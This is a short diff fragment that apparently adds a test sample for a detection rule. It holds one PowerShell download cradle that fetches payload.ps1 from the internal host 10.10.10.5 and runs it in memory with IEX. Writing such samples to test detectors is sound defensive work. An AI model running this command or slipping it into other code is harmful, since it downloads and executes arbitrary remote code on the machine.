@@ -1,0 +1,2 @@
+# Download cradle — hits branch 1 (fetch AND memory)
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')
